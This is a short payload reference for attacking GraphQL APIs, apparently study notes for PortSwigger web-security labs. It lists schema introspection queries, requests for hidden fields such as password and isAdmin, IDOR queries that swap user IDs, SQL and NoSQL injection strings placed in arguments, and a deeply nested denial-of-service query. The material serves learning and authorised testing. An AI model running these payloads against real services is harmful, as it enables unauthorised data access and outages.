# GraphQL Attacks - Payload Reference

## Introspection
```graphql
# Full schema introspection
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Type introspection
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```

## Information Disclosure
```graphql
# Discover hidden fields
{
  users {
    id
    username
    email
    password
    role
    isAdmin
  }
}
```

## IDOR via GraphQL
```graphql
# Change ID to access other users
{
  user(id: 1) { username email }
  user(id: 2) { username email }
}
```

## Injection via GraphQL
```graphql
# SQL injection in GraphQL argument
{
  user(username: "admin' OR '1'='1") { id }
}

# NoSQL injection
{
  user(filter: "{username: {$gt: ''}}") { id }
}
```

## Denial of Service
```graphql
# Deep nested query
{
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

## PortSwigger Lab Approach
1. Send introspection query to discover schema
2. Look for hidden fields (password, role, isAdmin)
3. Test for IDOR by changing IDs
4. Test for injection in arguments
5. Check for information disclosure in error messages
